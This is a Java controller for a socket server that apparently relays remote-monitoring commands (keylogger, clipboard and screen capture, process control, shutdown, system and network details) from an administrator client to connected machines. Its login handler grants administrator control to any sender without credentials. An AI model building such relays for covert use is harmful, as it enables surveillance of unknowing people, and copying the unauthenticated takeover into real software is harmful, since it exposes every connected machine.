package controllers;

import models.ClientSocketModel;
import models.MessageModel;
import models.SocketModel;
import server.Server;
import utils.JSON;
import utils.console;

import java.util.HashMap;
import java.util.Map;

import static utils.Command.*;
import static utils.Environment.*;

public class Controller {
    public static Map<String, Executable<JSON>> controller = new HashMap();
    private static final String PROPERTY_CLIENTS = "clients";

    public static void init() {
        put(COMMAND_LOGIN, Controller::getLogin);
        put(COMMAND_SHUTDOWN, Controller::shutdown);
        put(COMMAND_PROCESS, Controller::getProcess);
        put(COMMAND_NOTIFICATION, Controller::notify);
        put(COMMAND_DO_NOTHING, Controller::doNothing);
        put(COMMAND_END_PROCESS, Controller::endProcess);
        put(COMMAND_CLIPBOARD, Controller::getClipboard);
        put(COMMAND_KEYLOGGER, Controller::getKeylogger);
        put(COMMAND_CLIENT_SCREEN, Controller::getScreen);
        put(COMMAND_MONITORING, Controller::getMonitoring);
        put(COMMAND_GET_ALL_CLIENTS, Controller::getAllClients);
        put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
    }

    private static void shutdown(JSON json, SocketModel sender) {
        onHostSend(sender, Server.getClientConnections().get(json.get(TO)), json.toString());
    }

    private static void notify(JSON json, SocketModel sender) {
        Server.getHost().onSend(json.toString());
    }

    private static void doNothing(JSON json, SocketModel sender) {
    }

    private static void endProcess(JSON json, SocketModel sender) {
        onHostSend(sender, Server.getClientConnections().get(json.get(TO)), json.toString());
    }

    private static void getProcess(JSON json, SocketModel sender) {
        if (isHost(sender.getUUID())) {
            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_PROCESS).json());
            return;
        }
        Server.getHost().onSend(json.toString());
    }

    private static void getScreen(JSON json, SocketModel sender) {
        if (isHost(sender.getUUID())) {
            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_CLIENT_SCREEN).json());
            return;
        }
        Server.getHost().onSend(json.toString());
    }

    private static void getKeylogger(JSON json, SocketModel sender) {
        if (isHost(sender.getUUID())) {
            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_KEYLOGGER).json());
            return;
        }
        Server.getHost().onSend(json.toString());
    }

    private static void getClipboard(JSON json, SocketModel sender) {
        if (isHost(sender.getUUID())) {
            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_CLIPBOARD).json());
            return;
        }
        Server.getHost().onSend(json.toString());
    }

    private static void getMonitoring(JSON json, SocketModel sender) {
        if (isHost(sender.getUUID())) {
            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_MONITORING).json());
            return;
        }
        Server.getHost().onSend(json.toString());
    }
    
    private static void onHostSend(SocketModel sender, SocketModel receiver, String message) {
        if (receiver == null) {
            getSync(sender);
            return;
        }
        receiver.onSend(message);
    }
    
    private static void getClientSystemInfo(JSON json, SocketModel sender) {
        String uuid = sender.getUUID();
        ClientSocketModel client = Server.getClientConnections().get(uuid);
        JSON result = new JSON(json.get("result"));
        client.setOs(result.get(OS));
        client.setIp(result.get(IP));
        client.setRam(result.get(RAM));
        client.setCpu(result.get(CPU));
        client.setDisk(result.get(DISK));
        client.setHostName(result.get(HOSTNAME));
        client.setMAC_address(result.get(MAC_ADDRESS));
        console.log("Client[" + uuid + "] updated system info!");
    }

    private static void getLogin(JSON json, SocketModel sender) {
        String uuid = sender.getUUID();
        Server.setHost(uuid);
        console.warn("Client[" + uuid + "] is now a Administrator");
    }

    private static void getSync(SocketModel sender) {
        sender.onSend(new MessageModel(DEFAULT_SERVER_HOST, sender.getUUID(), COMMAND_SYNC).put(PROPERTY_CLIENTS, Server.getClientConnections().values()).json());
    }

    private static void getAllClients(JSON json, SocketModel sender) {
        sender.onSend(new MessageModel(DEFAULT_SERVER_HOST, sender.getUUID(), COMMAND_GET_ALL_CLIENTS).put(PROPERTY_CLIENTS, Server.getClientConnections().values()).json());
    }

    private static String getNotFoundController(JSON json, SocketModel sender) {
        return new MessageModel(DEFAULT_SERVER_HOST, sender.getUUID(), NOT_FOUND_CONTROLLER).json();
    }

    public static Executable get(String key) {
        return controller.getOrDefault(key, Controller::getNotFoundController);
    }

    public static Executable put(String key, Executable<JSON> value) {
        return controller.put(key, value);
    }

    public static boolean isHost(String uuid) {
        return uuid.equals(Server.getHost().getUUID());
    }
}
